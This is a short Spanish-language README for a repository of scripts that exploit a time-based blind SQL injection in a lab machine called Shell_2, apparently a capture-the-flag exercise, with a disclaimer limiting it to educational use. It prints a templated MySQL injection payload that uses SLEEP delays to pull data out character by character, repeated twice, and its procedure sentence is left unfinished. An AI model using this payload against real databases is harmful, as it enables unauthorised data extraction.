# Shell2SQLi
Este repositorio contiene scripts utilizados para `Shell_2`, una máquina con vulnerabilidad SQLi Blind.

## Consideraciones de la máquina

Algunas consideraciones
> El host `192.168.44.134` no está editado en los scripts, la VM se utilizó con configuración NAT
> 
> Uso de encabezado `X-Forwarded-For`
> 
> https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
> 
## Impacto vulnerabilidad SQLi

### Procedimiento:
Partiendo de la base en la que podemos validar una inyección exitosa con
```mysql
1' OR IF((SELECT SUBSTRING($column,$position,1) FROM $db_name.$table_name LIMIT $row_index,1)='$char', SLEEP(0.043), 0) #
```
Procedimos a 
```python
1' OR IF((SELECT SUBSTRING($column,$position,1) FROM $db_name.$table_name LIMIT $row_index,1)='$char', SLEEP(0.043), 0) #
```
    
## Disclaimer

El autor no se hace responsable de algún uso inadecuado del repositorio que pueda causar impactos negativos. El propósito es y sólo es, con fines educativos.
Las contribuciones son bienvenidas, también siéntete libre de mejorar y modificar según sea necesario.
